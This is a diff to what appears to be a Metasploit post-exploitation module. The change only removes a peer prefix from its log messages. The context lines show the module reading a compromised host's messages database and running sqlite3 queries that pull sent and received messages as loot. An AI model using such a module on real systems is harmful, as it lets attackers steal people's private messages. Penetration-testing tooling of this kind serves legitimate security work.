@@ -56,7 +56,7 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::Unknown, "#{peer} - Messages DB does not exist")
     end
 
-    print_good("#{peer} - Messages DB found: #{messages_path}")
+    print_good("Messages DB found: #{messages_path}")
 
     files = []
 
@@ -72,7 +72,7 @@ class MetasploitModule < Msf::Post
   # Collect messages db file.
   #
   def get_db(messages_path)
-    print_status("#{peer} - Looting #{messages_path} database")
+    print_status("Looting #{messages_path} database")
     message_data = read_file(messages_path)
     { filename: 'messages.db', mime: 'bin', data: message_data }
   end
@@ -81,7 +81,7 @@ class MetasploitModule < Msf::Post
   # Generate a readable version of the messages DB
   #
   def readable(messages_path)
-    print_status("#{peer} - Generating readable format")
+    print_status("Generating readable format")
     sql = [
       'SELECT datetime(m.date + strftime("%s", "2001-01-01 00:00:00"), "unixepoch", "localtime")  || " " ||',
       'case when m.is_from_me = 1 then "SENT" else "RECV" end || " " ||',
@@ -103,7 +103,7 @@ class MetasploitModule < Msf::Post
   # Generate a latest messages in readable format from the messages DB
   #
   def latest(messages_path)
-    print_status("#{peer} - Retrieving latest messages")
+    print_status("Retrieving latest messages")
     sql = [
       'SELECT datetime(m.date + strftime("%s", "2001-01-01 00:00:00"), "unixepoch", "localtime")  || " " ||',
       'case when m.is_from_me = 1 then "SENT" else "RECV" end || " " ||',
@@ -118,7 +118,7 @@ class MetasploitModule < Msf::Post
     ]
     sql = sql.join(' ')
     latest_data = cmd_exec("sqlite3 #{messages_path} '#{sql}'")
-    print_good("#{peer} - Latest messages: \n#{latest_data}")
+    print_good("Latest messages: \n#{latest_data}")
     { filename: 'latest.txt', mime: 'text/plain', data: latest_data }
   end
 
@@ -136,7 +136,7 @@ class MetasploitModule < Msf::Post
         e[:filename]
       )
 
-      print_good("#{peer} - #{e[:filename]} stored as: #{p}")
+      print_good("#{e[:filename]} stored as: #{p}")
     end
   end
 end
